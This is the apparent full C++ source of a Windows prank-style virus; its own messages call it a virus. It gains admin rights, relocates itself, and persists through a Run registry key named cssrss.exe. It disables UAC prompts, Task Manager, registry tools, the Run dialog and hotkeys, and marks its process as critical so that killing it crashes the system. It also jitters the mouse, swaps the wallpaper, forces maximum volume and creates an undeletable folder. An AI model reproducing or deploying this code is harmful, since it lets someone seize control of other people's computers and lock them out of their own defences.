#include <iostream>
#include <conio.h>
#include <thread>
#include <fstream>
#include <Windows.h>
#include <shellapi.h>
#include <io.h>
#include <direct.h>
#include <shellapi.h>
#include <shlobj.h>
#include <cstring>
#include <string>
#include <shlobj.h>
#include <tchar.h>
#include <winnt.h>
#include <ShlObj.h>
#include <locale>
#include <stdio.h>
#include <stdlib.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
//#pragma comment(lib,"winmm.lib")
#include <mmsystem.h>
#define PATH_DELIMITER '\\'
using namespace std;
int cq = 0;
int zishanchu();
void ForceUnmute();
void unbangq();
void bangq();
void big();
void desk();
void aaa();
void bb();
void playmusic();
void bizhi1();
void bizhi2();
void mouse();
void unreg(DWORD value);
bool deauto();
bool NoRun();
bool Run();
bool UAC();
bool unUAC();
bool ok = 0;
bool end1 = 0;
void AutoRun();
void ifp();
void main1();
void join();
void write2();
bool createDirectory();
string read1();
bool GetPrivilege();
void start();
void check();
void hide();
void display();
BOOL SetImmunity();
void ClearImmunity();
void writeun();
void unclose();
void close1();
void Win();
void unWin();
void refresh();
bool IsProcessRunAsAdmin();
void yinliang();

char *StringToChar(const string &object) {
	char *result = (char *) object.data();
	return result;
}

int main() {
	start();//开机自启动 +隐藏窗口（无while) +提权 + 无UAC + 防止关闭进程 + 关闭taskmgr + 关闭Win+...
	join();//加入线程：1.检测关闭 2.Main 3.禁用taskmgr 4.开机启动注册表设为启用
	return 0;
}

void AutoRun() {//开机启动
	const string &RegName = "cssrss.exe";
	string temp = R"(REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v )";
	const string &autorunName = RegName;
	string path = __argv[0];
	string cmd = temp + autorunName + " /t REG_SZ /d " + path + " /f";
	system(StringToChar(cmd));
}

void ifp() { //检测关闭
	while (1) {
		TCHAR desktopPath[MAX_PATH];
		SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);
		string filePath(desktopPath);
		filePath += "\\exit.txt";
		ifstream inputFile(filePath);
		string line;
		while (getline(inputFile, line)) {
			if (line == "exit") {
				display();
				//屏蔽控制台最小按钮和关闭按钮
				HWND hwnd = GetConsoleWindow();
				HMENU hmenu = GetSystemMenu(hwnd, false);
				RemoveMenu(hmenu, SC_CLOSE, MF_BYCOMMAND);
				LONG style = GetWindowLong(hwnd, GWL_STYLE);
				style &= ~(WS_MINIMIZEBOX);
				SetWindowLong(hwnd, GWL_STYLE, style);
				SetWindowPos(hwnd, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
				ShowWindow(hwnd, SW_SHOWNORMAL);
				DestroyMenu(hmenu);
				ReleaseDC(hwnd, NULL);
				//system("pause");
				end1 = 1;
				system("cls");
				cout << "此病毒预计将在预计2s后关闭..." << endl;
				Sleep(1000);
				cout << "正在恢复任务管理器..." << endl;
				HKEY hkey;
				DWORD value = 0;
				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
				RegCloseKey(hkey);
				cout << "任务管理器已恢复" << endl;
				cout << "正在恢复UAC..." << endl;
				UAC();
				cout << "UAC已恢复" << endl;
				cout << "正在恢复快捷键..." << endl;
				Win();
				cout << "快捷键已恢复" << endl;
				cout << "正在关闭守护进程..." << endl;
				close1();
				cout << "成功关闭守护进程" << endl;
				cout << "正在取消开机自启动..." << endl;
				deauto();
				cout << "已经关闭开机自启动..." << endl;
				cout << "正在恢复禁用运行..." << endl;
				Run();
				cout << "运行已恢复" << endl;
				cout << "正在恢复注册表及文件..." << endl;
				unreg(0);
				system("del //f //q \" C://users//public//cssrss \" ") ;
				cout << "注册表与文件已恢复" << endl;
				cout << "正在删除无法删除文件..." << endl;
				unbangq();
				unbangq();
				unbangq();
				unbangq();
				cout << "已经删除无法删除文件" << endl;
				cout << "按任意键以继续" << endl;
				getch();
				Sleep(1000);
				system("cls");
				system("taskkill /f /im explorer.exe");
				Sleep(500);
				system("explorer.exe");
				system("cls");
				for (int i = 1; i <= 50; i++) {
					MessageBox(NULL, "See you next time.Click 50 times~~~ :> ", "Notice", NULL);
				}
				system("taskkill /f /im cssrss.exe");
				exit(0);
			}
		}
	}
}

void main1() { //main
	if (read1() != "1") {
		createDirectory();
		//writeun();
		write2();
		system("cls");
		//进行病毒操作
	} else { //重启后 main!!!
		system("cls");
		cout << "end";

	}
//	while(end1==0){
//
//	}
}

void join() { //加入线程：1.检测关闭 2.Main 3.防止禁用开机自启 4.refresh 5.鼠标 6.桌面壁纸
	thread pan1(ifp);
	thread pan2(main1);
	thread pan3(check);
	thread pan4(refresh);
	thread pan5(mouse);
	thread pan6(big);
	thread pan7(playmusic);
	thread pan8(desk);
	thread pan9(yinliang);
	pan1.join();
	pan2.join();
	pan3.join();
	pan4.join();
	pan5.join();
	pan6.join();
	pan7.join();
	pan8.join();
	pan9.join();
}

void write2() { //写入进度
	while (ok == 1) {
		Sleep(1);
	}
	//createDirectory("C:\Users\Public\cssrss");
	string folderPath = "C:\\Users\\Public\\cssrss"; // 设置要写入的文件夹路径
	ofstream file(folderPath + "/now.txt"); // 创建输出流对象并打开文件
	file << "1" << endl; // 向文件中写入内容
	file.close(); // 关闭文件
}

bool createDirectory() {//创建文件夹
	const std::string folder = "C:\\Users\\Public\\cssrss";
	std::string folder_builder;
	std::string sub;
	sub.reserve(folder.size());
	for (auto it = folder.begin(); it != folder.end(); ++it) {
		//cout << *(folder.end()-1) << endl;
		const char c = *it;
		sub.push_back(c);
		if (c == PATH_DELIMITER || it == folder.end() - 1) {
			folder_builder.append(sub);
			if (0 != ::_access(folder_builder.c_str(), 0)) {
				// this folder not exist
				if (0 != ::_mkdir(folder_builder.c_str())) {
					// create failed
					return false;
				}
			}
			sub.clear();
		}
	}
	return true;
}

string read1() { //读取进度
	string filePath = "C:\\Users\\Public\\cssrss\\now.txt";
	ifstream inputFile(filePath);
	string line;
	while (getline(inputFile, line)) {
		return line;
	}
}

BOOL IsAdmin() {
	return IsUserAnAdmin();
}

BOOL ElevateAndRun() {
	if (IsAdmin()) {
		return TRUE;   // 已经提权，继续执行
	}
	TCHAR szPath[MAX_PATH];
	if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) {
		_tprintf(_T("GetModuleFileName failed, error=%d\n"), GetLastError());
		return FALSE;
	}
	LPCTSTR lpCmdLine = GetCommandLine();
	TCHAR szParams[MAX_PATH * 2] = { 0 };
	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
	sei.lpVerb = _T("runas");
	sei.lpFile = szPath;
	sei.lpParameters = NULL;   // 如需传递参数，请构造参数串
	sei.nShow = SW_SHOWNORMAL;
	sei.fMask = SEE_MASK_NOCLOSEPROCESS;  // 可选，便于等待
	if (!ShellExecuteEx(&sei)) {
		DWORD dwErr = GetLastError();
		if (dwErr == ERROR_CANCELLED) {
			_tprintf(_T("用户取消 UAC 提示\n"));
		} else {
			_tprintf(_T("提权启动失败, error=%d\n"), dwErr);
		}
		return FALSE;
	}
	exit(0);
	return FALSE;  // 不会执行到
}


bool GetPrivilege() {
	if (!ElevateAndRun()) {
		_tprintf(_T("无法获得管理员权限，程序退出\n"));
		return 1;
	}
	_tprintf(_T("以管理员身份运行\n"));
}

//bool GetPrivilege() { //提权
//	CreateEvent(NULL, FALSE, FALSE, _T("{29544E05-024F-4BC1-A272-452DBC8E17A4}"));
//	if (ERROR_SUCCESS != GetLastError()) {
//		return false;
//	} else {
//		TCHAR strPath[MAX_PATH] = { 0 };
//		HMODULE hModule = NULL;
//		GetModuleFileName(hModule, strPath, MAX_PATH);
//
//		SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
//		sei.lpVerb = TEXT("runas");
//		sei.lpFile = strPath;
//		sei.nShow = SW_SHOWNORMAL;
//		if (!ShellExecuteEx(&sei)) {
//
//			DWORD dwStatus = GetLastError();
//			if (dwStatus == ERROR_CANCELLED) {
//				return false;
//			} else if (dwStatus == ERROR_FILE_NOT_FOUND) {
//				return false;
//			}
//		}
//	}
//	Sleep(100);
//	exit(0);
//}

void start() { //开机自启动

	GetPrivilege();
	zishanchu();
	if (IsProcessRunAsAdmin() == 0) {
		system("taskkill /f /im cssrss.exe");
		exit(0);
	}
	if (read1() == "1") {
		cq = 1;
	} else {
		cq = 0;
	}
	unWin();//禁止热键
	hide();//隐藏窗口
	AutoRun();//开机自启
	unclose();//防止结束进程
	unUAC();//防止开机启动提示UAC
	NoRun();//禁止热键
	unreg(1);
	system("taskkill /f /im taskmgr.exe");//关闭任务管理器

	system("taskkill /f /im explorer.exe");
	Sleep(100);
	system("explorer.exe");

	if (cq == 0) {
		bangq();
	}
}

void check() {
	HKEY hkey;
	DWORD value = 1;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	system("title cssrss");
	HKEY hKey;
	LONG lRes = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
	                           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", 0, NULL, REG_OPTION_NON_VOLATILE,
	                           KEY_ALL_ACCESS, NULL, &hKey, NULL);
	const char* targetProcessName = "cssrss.exe";
	HWND hwnd = FindWindow(NULL, targetProcessName);
	BYTE binaryData[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	while (end1 == 0) {
		system("taskkill /f /im taskmgr.exe") ;
		unUAC();
		unWin();
		unreg(1);
		AutoRun();
		unreg(1);
		NoRun();
		ShowWindow(hwnd, SW_HIDE);
		lRes = RegSetValueEx(hKey, "cssrss.exe", 0, REG_BINARY, binaryData, sizeof(binaryData));
		Sleep(100);
	}
}

void hide() {
	HWND hwnd;
	hwnd = FindWindow("ConsoleWindowClass", NULL);
	if (hwnd) {
		ShowWindow(hwnd, SW_HIDE);
	}
}

void display() {
	HWND hwnd;
	hwnd = FindWindow("ConsoleWindowClass", NULL);
	if (hwnd) {
		ShowWindow(hwnd, SW_SHOW);
	}
}

BOOL SetImmunity(char file[]) {
	BOOL bRet = CreateDirectory(file, NULL);
	if (bRet) {
		strcat(file, "\\fuc...\\");
		bRet = CreateDirectory(file, NULL);
		if (bRet) {
			SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN);
			return TRUE;
		}
	}
	return FALSE;
}
void ClearImmunity(char file[]) {
	char file1[100001];
	for (int i = 0; i < strlen(file); i++) {
		file1[i] = file[i];
	}
	strcat(file, "\\fuc...\\");
	RemoveDirectory(file);
	ZeroMemory(file, MAX_PATH);
	RemoveDirectory(file1);
}
void writeun() {
	ok = 0;
	char *Fuk[2] = { "cssrss" };
	int FukLen = sizeof(Fuk) / sizeof(int);

	TCHAR Destop[MAX_PATH];
	SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);

	for (int x = 0; x < FukLen; x++) {
		//SetImmunity("C:\\Users\\Public\\", Fuk[x]);
		//ClearImmunity("C:\\Users\\Public\\", Fuk[x]);
	}
	ok = 1;
	//system("pause");
}
void unclose() {
	typedef ULONG(__stdcall *PRtlAdjustPrivilege)(ULONG Privilege, int Enable, int CurrentThread, int *Enabled);
	typedef ULONG(__stdcall *PNtSetInformationProcess)(HANDLE ProcessHandle, ULONG InformationClass, void *Information,
	        ULONG Length);
	HMODULE ntdll;
	int b;
	PRtlAdjustPrivilege pRtlAdjustPrivilege;
	PNtSetInformationProcess pNtSetInformationProcess;
	ntdll = GetModuleHandleW(L"ntdll.dll");
	pRtlAdjustPrivilege = (PRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	pNtSetInformationProcess = (PNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
	pRtlAdjustPrivilege(20, 1, 0, &b);
	b = 1;
	pNtSetInformationProcess((HANDLE) - 1, 0x1d, &b, sizeof(b));
}
void close1() {
	typedef ULONG(__stdcall *PRtlAdjustPrivilege)(ULONG Privilege, int Enable, int CurrentThread, int *Enabled);
	typedef ULONG(__stdcall *PNtSetInformationProcess)(HANDLE ProcessHandle, ULONG InformationClass, void *Information,
	        ULONG Length);
	HMODULE ntdll;
	int b;
	PRtlAdjustPrivilege pRtlAdjustPrivilege;
	PNtSetInformationProcess pNtSetInformationProcess;
	ntdll = GetModuleHandleW(L"ntdll.dll");
	pRtlAdjustPrivilege = (PRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	pNtSetInformationProcess = (PNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
	pRtlAdjustPrivilege(20, 1, 0, &b);
	b = 0;
	pNtSetInformationProcess((HANDLE) - 1, 0x1d, &b, sizeof(b));
}
bool unUAC() {
	HKEY hKey;
	DWORD dwDisposition;

	if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL,
	                    REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
		DWORD data = 0;
		if (RegSetValueExW(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, (const BYTE * )&data,
		                   sizeof(data)) != ERROR_SUCCESS) {
			return false;
		}

		RegCloseKey(hKey);
		return true;
	} else {
		return false;
	}
}
bool UAC() {
	HKEY hKey;
	DWORD dwDisposition;
	if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL,
	                    REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
		DWORD data = 5;
		if (RegSetValueExW(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, (const BYTE * )&data,
		                   sizeof(data)) != ERROR_SUCCESS) {
			return false;
		}

		RegCloseKey(hKey);
		return true;
	} else {
		return false;
	}
}
void unWin() {
	HKEY hKey;
	LPCTSTR subkey = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
	LPCTSTR valueName = _T("DisabledHotkeys");
	LPCTSTR data = _T("ABCDEFGHIJKLMNOPQRSTUVWXYZ");

	LONG openResult = RegCreateKeyEx(HKEY_CURRENT_USER, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
	                                 &hKey, NULL);
	if (openResult != ERROR_SUCCESS) {
		std::cout << "Error opening or creating registry key!" << std::endl;
	}

	// 检查是否已经存在名为DisabledHotkeys的字符串值
	DWORD valueType;
	TCHAR buffer[1024];
	DWORD bufferSize = sizeof(buffer);
	LONG queryResult = RegQueryValueEx(hKey, valueName, NULL, &valueType, reinterpret_cast<LPBYTE>(buffer), &bufferSize);

//    if (queryResult == ERROR_SUCCESS && valueType == REG_SZ)
//    {
//        std::wcout << L"The value DisabledHotkeys already exists with value: " << buffer << std::endl;
//    }
//    else
//    {
	// 创建或设置名为DisabledHotkeys的字符串值
	LONG setResult = RegSetValueEx(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE *>(data),
	                               lstrlen(data) * sizeof(TCHAR));
	if (setResult == ERROR_SUCCESS) {
		std::wcout << L"The value DisabledHotkeys has been created and set to: " << data << std::endl;
	} else {
		std::cout << "Error creating or setting the value DisabledHotkeys!" << std::endl;
	}
//    }

	RegCloseKey(hKey);

}
void Win() {
	HKEY hKey;
	LONG regStatus = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0,
	                              KEY_SET_VALUE, &hKey);

	if (regStatus == ERROR_SUCCESS) {
		regStatus = RegDeleteValue(hKey, "DisabledHotkeys");

		if (regStatus == ERROR_SUCCESS) {
			std::cout << "Registry value deleted successfully." << std::endl;
		} else {
			std::cout << "Failed to delete registry value. Error code: " << regStatus << std::endl;
		}

		RegCloseKey(hKey);
	} else {
		std::cout << "Failed to open registry key. Error code: " << regStatus << std::endl;
	}
}
bool NoRun() {
	HKEY hKey;
	DWORD dwDisposition;

	if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", 0, NULL,
	                    REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
		DWORD data = 1;
		if (RegSetValueExW(hKey, L"NoRun", 0, REG_DWORD, (const BYTE * )&data, sizeof(data)) != ERROR_SUCCESS) {
			return false;
		}

		RegCloseKey(hKey);
		return true;
	} else {
		return false;
	}
}
bool Run() {
	HKEY hKey;
	DWORD dwDisposition;

	if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, NULL,
	                    REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
		DWORD data = 0;
		if (RegSetValueExW(hKey, L"NoRun", 0, REG_DWORD, (const BYTE * )&data, sizeof(data)) != ERROR_SUCCESS) {
			return false;
		}

		RegCloseKey(hKey);
		return true;
	} else {
		return false;
	}
}
void refresh() {
	Sleep(1000);
	system("taskkill /f /im explorer.exe");
	Sleep(1000);
	system("explorer.exe");
	while (1) {
		getch();
	}
}
bool deauto() {
	HKEY hKey;
	LONG regOpenResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
	                                  KEY_ALL_ACCESS, &hKey);
	if (regOpenResult == ERROR_SUCCESS) {
		LONG regDeleteResult = RegDeleteValue(hKey, "cssrss.exe");
		if (regDeleteResult == ERROR_SUCCESS) {
			return true;
			// 删除成功
		} else {
			return false;
			// 删除失败
		}
		RegCloseKey(hKey);
	}
	return false;
}
void unreg(DWORD value) { //0不禁用1禁用
	HKEY hkey;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}
void mouse() {
	int x, y, a;
	POINT p;
	srand((unsigned) time(NULL));
	while (end1 == 0) {
		GetCursorPos(&p);
		x = rand() % 2;
		y = rand() % 2;
		a = rand() % 2;
		if (a == 1) {
			SetCursorPos(p.x + x / 2.0, p.y + y / 2.0);
			SetCursorPos(p.x - x, p.y + y);
		} else if (a == 0) {
			SetCursorPos(p.x - x, p.y - y);
			SetCursorPos(p.x + x, p.y - y);
		}
		Sleep(15);
	}
}
bool IsProcessRunAsAdmin() {
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;

	BOOL  Op = AllocateAndInitializeSid(
	               &NtAuthority,
	               2,
	               SECURITY_BUILTIN_DOMAIN_RID,
	               DOMAIN_ALIAS_RID_ADMINS,
	               0, 0, 0, 0, 0, 0,
	               &AdministratorsGroup);

	if (Op) {
		CheckTokenMembership(NULL, AdministratorsGroup, &Op);
		FreeSid(AdministratorsGroup);
	}

	return  Op == TRUE ;
}
void playmusic() {
	if (cq == 0) {
		system("xcopy song.mp3 C:\\Users\\Public\\cssrss\\");
		DeleteFile("song.mp3");
	}
	mciSendString(TEXT("open C:\\Users\\Public\\cssrss\\song.mp3 alias s1"), NULL, 0, NULL);

	mciSendString(TEXT("play s1"), NULL, 0, NULL);

	Sleep(60000);//试听

	mciSendString(TEXT("close s1"), NULL, 0, NULL);
	return ;
}
void big() {
	CoInitialize(NULL);

	IMMDeviceEnumerator *deviceEnumerator;
	IMMDevice *defaultDevice;
	IAudioEndpointVolume *endpointVolume;

	CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER, __uuidof(IMMDeviceEnumerator),
	                 (LPVOID *)&deviceEnumerator);
	deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
	deviceEnumerator->Release();

	defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (LPVOID *)&endpointVolume);
	defaultDevice->Release();
	while (end1 == 0) {
		// 将音量调整到 100%
		float volumeLevel = 1.0f;
		endpointVolume->SetMasterVolumeLevelScalar(volumeLevel, NULL);

		// 取消静音
		BOOL isMuted;
		endpointVolume->GetMute(&isMuted);
		if (isMuted) {
			endpointVolume->SetMute(FALSE, NULL);
		}
	}
	endpointVolume->Release();
	CoUninitialize();
}
void aaa(TCHAR wallpaper[MAX_PATH]) {
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaper, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

}
void bb() {
	std::wstring newWallpaper = L"C:\\Users\\Public\\cssrss\\sb2.jpg"; // 替换为新的壁纸路径
	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)newWallpaper.c_str(), SPIF_UPDATEINIFILE);
}
void desk() {
	string filePath = "C://users//public//cssrss//wallpaper.txt";
	TCHAR wallpaper[MAX_PATH];
	if (cq == 0) {
		system("xcopy sb2.jpg C:\\Users\\Public\\cssrss\\");
		DeleteFile("sb2.jpg");

		SystemParametersInfo(SPI_GETDESKWALLPAPER, MAX_PATH, wallpaper, 0);
		ofstream outFile(filePath);
		outFile << wallpaper;
		outFile.close();
	}
	ifstream inFile(filePath);
	string line;
	getline(inFile, line);
	cout << line;
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, line.c_str(), static_cast<int>(line.length()), NULL, 0);
	std::wstring wideString(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, line.c_str(), static_cast<int>(line.length()), &wideString[0], size_needed);

	int size_needed2 = WideCharToMultiByte(CP_ACP, 0, wideString.c_str(), static_cast<int>(wideString.length()), NULL, 0,
	                                       NULL, NULL);
	std::string multiByteString(size_needed2, 0);
	WideCharToMultiByte(CP_ACP, 0, wideString.c_str(), static_cast<int>(wideString.length()), &multiByteString[0],
	                    size_needed2, NULL, NULL);

	char* charString = new char[multiByteString.length() + 1];
	strcpy(charString, multiByteString.c_str());

	while (end1 == 0) {
		aaa(charString);
		Sleep((rand() % (rand() % rand())) % (rand() % 800));
		bb();
		Sleep((rand() % (rand() % rand())) % (rand() % 800));
	}
	aaa(charString);
	delete[] charString;
}
void bangq() {
	TCHAR desktopPath[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);
	string filePath(desktopPath);
	string gg = "\\";
	filePath += gg;
	filePath += "fuc";
	char ch[10001];
	strcpy(ch, filePath.c_str());
	SetImmunity(ch);
}
void unbangq() {
	TCHAR desktopPath[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);
	string filePath(desktopPath);
	string gg = "\\";
	filePath += gg;
	filePath += "Exclusive production by exp.（exp独自制作。）";
	char ch[10001];
	strcpy(ch, filePath.c_str());
	ClearImmunity(ch);

}
void ForceUnmute() {
	HRESULT hr;
	IMMDeviceEnumerator* pEnumerator = nullptr;
	IMMDevice* pDevice = nullptr;
	IAudioEndpointVolume* pAudioEndpointVolume = nullptr;

	// 1. 创建设备枚举器
	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator),
	                      (void **)&pEnumerator);
	if (FAILED(hr))
		return;

	// 2. 获取默认音频输出设备
	hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
	if (FAILED(hr)) {
		pEnumerator->Release();
		return;
	}

	// 3. 激活音量控制接口
	hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void **)&pAudioEndpointVolume);
	if (FAILED(hr)) {
		pDevice->Release();
		pEnumerator->Release();
		return;
	}

	// 4. 检查并强制取消静音
	BOOL bMuted = FALSE;
	hr = pAudioEndpointVolume->GetMute(&bMuted);
	if (SUCCEEDED(hr) && bMuted) {
		// 如果处于静音状态，则强制取消静音
		hr = pAudioEndpointVolume->SetMute(FALSE, NULL);
		if (SUCCEEDED(hr)) {
			std::cout << "检测到静音，已强制取消。" << std::endl;
		}
	}

	// 5. 释放资源
	pAudioEndpointVolume->Release();
	pDevice->Release();
	pEnumerator->Release();
}
void yinliang(){
     // 初始化COM库
	CoInitialize(NULL);

	std::cout << "开始监视静音状态，按 Ctrl+C 退出。" << std::endl;
	while (true) {
		ForceUnmute();
		Sleep(100); // 每秒检查一次d
	}

	CoUninitialize();
     
     } 
// 目标目录（固定）
const std::string TARGET_DIR = "C:\\Users\\Public\\cssrss";

// 获取当前可执行文件路径（ANSI）
std::string GetCurrentExePathA() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

// 从路径中提取目录（不包含文件名）
std::string GetDirectoryFromPath(const std::string& path) {
    size_t pos = path.find_last_of("\\/");
    if (pos == std::string::npos) return "";
    return path.substr(0, pos);
}

// 从路径中提取文件名
std::string GetFileNameFromPath(const std::string& path) {
    size_t pos = path.find_last_of("\\/");
    if (pos == std::string::npos) return path;
    return path.substr(pos + 1);
}

// 判断当前程序是否已经在目标目录中
bool IsInTargetDirectory() {
    std::string currentPath = GetCurrentExePathA();
    std::string currentDir = GetDirectoryFromPath(currentPath);
    // 比较目录（忽略大小写，Windows 不区分）
    for (char& c : currentDir) c = tolower(c);
    std::string targetLower = TARGET_DIR;
    for (char& c : targetLower) c = tolower(c);
    return currentDir == targetLower;
}

// 正常功能（示例）
void RunNormalFunction() {
    //continue
}
   
int zishanchu(){
	// ★ 关键检测：如果已经在目标目录，则不再移动 ★
    if (IsInTargetDirectory()) {
        RunNormalFunction();
        return 0;
    }

    // ---- 以下是自移动逻辑（仅在首次运行时执行） ----
    std::string currentPath = GetCurrentExePathA();
    std::string fileName = GetFileNameFromPath(currentPath);
    std::string targetPath = TARGET_DIR + "\\" + fileName;

    // 创建目标目录
    CreateDirectoryA(TARGET_DIR.c_str(), NULL);

    // 生成临时批处理文件
    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    GetTempFileNameA(tempPath, "MOVE", 0, tempFile);
    std::string batchPath = tempFile;
    size_t dotPos = batchPath.find_last_of('.');
    if (dotPos != std::string::npos)
        batchPath = batchPath.substr(0, dotPos) + ".bat";
    else
        batchPath += ".bat";
    DeleteFileA(tempFile);

    // 写入批处理脚本
    std::ofstream batchFile(batchPath.c_str());
    if (!batchFile.is_open()) {
        std::cerr << "无法创建批处理文件！" << std::endl;
        return 1;
    }

    batchFile << "@echo off\n";
    batchFile << ":loop\n";
    batchFile << "ping 127.0.0.1 -n 3 > nul\n";
    batchFile << "move /Y \"" << currentPath << "\" \"" << targetPath << "\"\n";
    batchFile << "if exist \"" << currentPath << "\" goto loop\n";
    // 可选：移动成功后自动启动新程序
    batchFile << "start \"\" \"" << targetPath << "\"\n";
    batchFile << "del /F /Q \"" << batchPath << "\"\n";
    batchFile.close();

    // 以隐藏窗口启动批处理
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    std::string cmdLine = "cmd.exe /c \"" + batchPath + "\"";
    CreateProcessA(NULL, &cmdLine[0], NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "正在自移动至: " << targetPath << std::endl;
    std::cout << "移动完成后会自动启动新程序。" << std::endl;
    exit(0); 
} 






     

//问题：1.一段时间会蓝屏 A:播放完就没有程序可干了自然推出return 0; 2.镜像劫持 自删除子关闭 
//-lwinmm -lole32
